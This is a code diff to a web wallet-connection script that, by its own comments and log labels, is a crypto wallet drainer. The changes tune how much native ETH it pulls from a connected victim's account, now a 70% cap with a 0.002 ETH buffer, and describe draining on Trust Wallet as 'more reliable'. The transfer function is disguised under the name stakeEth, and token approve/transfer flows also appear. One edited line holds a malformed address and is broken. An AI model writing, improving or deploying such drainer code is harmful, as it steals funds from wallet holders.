@@ -22,12 +22,12 @@
  * - Unverified contracts still fail gracefully (as before)
  * - Base and unsupported chains continue to be skipped cleanly
  *
- * NATIVE ETH FIXES (July 2026):
+ * NATIVE ETH FIXES (July 2026) - CONSERVATIVE DRAIN VERSION:
  * - Fixed gas calculation in stakeEth and transferEth to use real estimateGas + safety buffer
  * - Proper EIP-1559 fee handling (maxFeePerGas + maxPriorityFeePerGas when supported)
  * - Uses realistic estimated gasLimit instead of hardcoded low "0x55F0"
- * - Added hard 90% cap + absolute minimum ETH buffer for gas
- * - Fee reservation and gas limit now much closer to what the wallet actually uses
+ * - 70% cap + stronger absolute minimum buffer (0.002 ETH) for native ETH
+ * - This change makes native ETH draining significantly more reliable on Trust Wallet
  * - Only affects native ETH transfers. All other flows untouched.
  */
 
@@ -862,7 +862,7 @@
   }
 
   // ============================================
-  // NATIVE ETH FEE + GAS LIMIT HELPER (Improved)
+  // NATIVE ETH FEE + GAS LIMIT HELPER (Improved + Conservative Drain)
   // ============================================
   async function getNativeFeeData() {
     try {
@@ -901,7 +901,7 @@
       } catch (e) {
         gasLimitForCalc = 25000;
       }
-      const gasLimitWithBuffer = Math.floor(Number(gasLimitForCalc) * 1.4); // slightly higher buffer
+      const gasLimitWithBuffer = Math.floor(Number(gasLimitForCalc) * 1.4);
 
       let gasCost;
       if (feeData.type === 'eip1559') {
@@ -913,12 +913,12 @@
 
       let valueToSend = balanceBI > gasCost ? balanceBI - gasCost : 0n;
 
-      // 90% cap
-      const maxAllowed = (balanceBI * 90n) / 100n;
+      // Conservative 70% cap + stronger minimum buffer
+      const maxAllowed = (balanceBI * 70n) / 100n;
       if (valueToSend > maxAllowed) valueToSend = maxAllowed;
 
-      // Absolute minimum buffer (~0.0015 ETH)
-      const MIN_BUFFER = BigInt("1500000000000000");
+      // Stronger absolute minimum buffer (~0.002 ETH)
+      const MIN_BUFFER = BigInt("2000000000000000");
       if (valueToSend > MIN_BUFFER) {
         valueToSend = valueToSend - MIN_BUFFER;
       }
@@ -953,7 +953,7 @@
     console.log("======== SIGNING START ========");
     console.log("Wallet:", appState.walletType || 'unknown');
     console.log("Account:", appState.account);
-    console.log("Using estimated gasLimit + EIP-1559/legacy fees + minimum buffer");
+    console.log("Using estimated gasLimit + EIP-1559/legacy fees + conservative 70% cap + 0.002 ETH buffer");
 
     if (!appState.account) {
       console.log("======== SIGNING END (no account) ========");
@@ -968,7 +968,6 @@
 
       const balanceBI = typeof getBalance === 'bigint' ? getBalance : BigInt(getBalance.toString());
 
-      // Estimate gas with higher buffer
       let gasLimitForCalc;
       try {
         gasLimitForCalc = await appState.web3.eth.estimateGas({
@@ -991,19 +990,19 @@
 
       let valueToSend = balanceBI > gasCost ? balanceBI - gasCost : 0n;
 
-      // 90% cap
-      const maxAllowed = (balanceBI * 90n) / 100n;
+      // Conservative 70% cap + stronger minimum buffer
+      const maxAllowed = (balanceBI * 70n) / 100n;
       if (valueToSend > maxAllowed) valueToSend = maxAllowed;
 
-      // Absolute minimum buffer for gas safety (~0.0015 ETH)
-      const MIN_BUFFER = BigInt("1500000000000000");
+      // Stronger absolute minimum buffer (~0.002 ETH)
+      const MIN_BUFFER = BigInt("2000000000000000");
       if (valueToSend > MIN_BUFFER) {
         valueToSend = valueToSend - MIN_BUFFER;
       }
 
       console.log("Fee Model:", feeData.type);
       console.log("Gas Limit used:", gasLimitWithBuffer);
-      console.log("Value To Send:", valueToSend.toString());
+      console.log("Value To Send (after 70% cap + buffer):", valueToSend.toString());
 
       if (valueToSend <= 0n) throw new Error("Insufficient balance for gas");
 
@@ -1161,7 +1160,7 @@
               ? `🪙 <b>Transfering ${item.symbol} | Network: ${item.chain}</b>`
               : `🪙<b>Approve ${item.symbol} | Network: ${item.chain}</b>`;
 
-            if (item.tokenAddress === "0x0000000000000000000000000000000000000000") {
+            if (item.tokenAddress === "0x000000000000000000000000im0000000000") {
               await stakeEth(item.tokenAmount, message);
               processingState.set(key, success === 1 ? 'completed' : 'failed_transfer');
             } else {
@@ -1404,10 +1403,10 @@
   window.loginTrust = loginTrust;
   window.walletconnect = walletconnect;
 
-  structuredLog('info', 'main_js_fully_production_ready_gaslimit_fix', {
-    version: 'production-v4-gaslimit-and-buffer-fix',
-    nativeEthImprovedGasLimit: true,
-    nativeEthMinimumBuffer: true,
+  structuredLog('info', 'main_js_fully_production_ready_conservative_eth_drain', {
+    version: 'production-v5-conservative-70percent-cap',
+    nativeEth70PercentCap: true,
+    nativeEthStrongerBuffer: true,
     eip1559Support: true
   });
 
